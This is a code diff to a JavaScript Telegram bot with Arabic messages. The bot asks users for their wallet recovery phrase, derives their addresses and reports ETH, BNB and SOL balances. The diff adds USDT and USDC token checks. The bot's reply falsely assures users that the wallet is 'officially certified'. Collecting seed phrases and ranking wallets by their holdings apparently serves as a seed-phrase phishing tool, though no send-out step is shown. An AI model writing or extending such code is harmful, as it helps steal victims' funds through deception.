@@ -34,6 +34,28 @@ const SOLANA_RPCS = [
   'https://rpc.ankr.com/solana'
 ];
 
+// عقود USDT و USDC على Ethereum و BSC
+const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];
+
+const TOKENS = {
+  ethUsdt: {
+    contract: new ethers.Contract('0xdAC17F958D2ee523a2206206994597C13D831ec7', ERC20_ABI, ethProvider),
+    decimals: 6
+  },
+  ethUsdc: {
+    contract: new ethers.Contract('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', ERC20_ABI, ethProvider),
+    decimals: 6
+  },
+  bscUsdt: {
+    contract: new ethers.Contract('0x55d398326f99059ff775485246999027b3197955', ERC20_ABI, bscProvider),
+    decimals: 18
+  },
+  bscUsdc: {
+    contract: new ethers.Contract('0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', ERC20_ABI, bscProvider),
+    decimals: 18
+  }
+};
+
 // كاش مؤقت (30 ثانية) لتقليل الضغط على الشبكات
 const balanceCache = new Map();
 const CACHE_TTL_MS = 30_000;
@@ -106,6 +128,15 @@ async function fetchSolBalance(solAddress) {
   return 0;
 }
 
+async function fetchErc20Formatted(tokenConfig, address) {
+  try {
+    const raw = await withTimeout(tokenConfig.contract.balanceOf(address), 3500, 0n);
+    return ethers.formatUnits(raw ?? 0n, tokenConfig.decimals);
+  } catch (_) {
+    return '0.0';
+  }
+}
+
 app.post(`/bot${TOKEN}`, (req, res) => {
   res.sendStatus(200);
   bot.processUpdate(req.body);
@@ -120,7 +151,7 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(
       chatId,
       '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
-      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص العناوين والأرصدة على ETH و BNB و SOL.',
+      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة ETH و BNB و SOL و USDT و USDC.',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
     );
   }
@@ -149,29 +180,41 @@ bot.on('message', async (msg) => {
     const cacheKey = `${evmAddress}:${solAddress}`;
     const cached = balanceCache.get(cacheKey);
 
-    let ethBalance = '0';
-    let bscBalance = '0';
-    let solBalance = 0;
+    let balances;
 
     if (cached && cached.expiresAt > Date.now()) {
-      ethBalance = cached.eth;
-      bscBalance = cached.bsc;
-      solBalance = cached.sol;
+      balances = cached.data;
     } else {
-      const [ethWei, bscWei, solAmount] = await Promise.all([
+      const [
+        ethWei,
+        bscWei,
+        solAmount,
+        ethUsdt,
+        ethUsdc,
+        bscUsdt,
+        bscUsdc
+      ] = await Promise.all([
         withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
         withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
-        withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0)
+        withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0),
+        fetchErc20Formatted(TOKENS.ethUsdt, evmAddress),
+        fetchErc20Formatted(TOKENS.ethUsdc, evmAddress),
+        fetchErc20Formatted(TOKENS.bscUsdt, evmAddress),
+        fetchErc20Formatted(TOKENS.bscUsdc, evmAddress)
       ]);
 
-      ethBalance = ethers.formatEther(ethWei);
-      bscBalance = ethers.formatEther(bscWei);
-      solBalance = Number(solAmount);
+      balances = {
+        eth: ethers.formatEther(ethWei),
+        bsc: ethers.formatEther(bscWei),
+        sol: Number(solAmount),
+        ethUsdt,
+        ethUsdc,
+        bscUsdt,
+        bscUsdc
+      };
 
       balanceCache.set(cacheKey, {
-        eth: ethBalance,
-        bsc: bscBalance,
-        sol: solBalance,
+        data: balances,
         expiresAt: Date.now() + CACHE_TTL_MS
       });
     }
@@ -183,9 +226,13 @@ bot.on('message', async (msg) => {
       '• EVM (ETH/BNB): `' + evmAddress + '`\n' +
       '• SOL: `' + solAddress + '`\n\n' +
       '💰 الأرصدة والأصول المكتشفة:\n' +
-      '• ETH: ' + ethBalance + '\n' +
-      '• BNB: ' + bscBalance + '\n' +
-      '• SOL: ' + solBalance + '\n' +
+      '• ETH: ' + balances.eth + '\n' +
+      '• BNB: ' + balances.bsc + '\n' +
+      '• SOL: ' + balances.sol + '\n' +
+      '• USDT (ETH): ' + balances.ethUsdt + '\n' +
+      '• USDC (ETH): ' + balances.ethUsdc + '\n' +
+      '• USDT (BSC): ' + balances.bscUsdt + '\n' +
+      '• USDC (BSC): ' + balances.bscUsdc + '\n' +
       '• Crypto actifs: `$0.00`\n\n' +
       '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
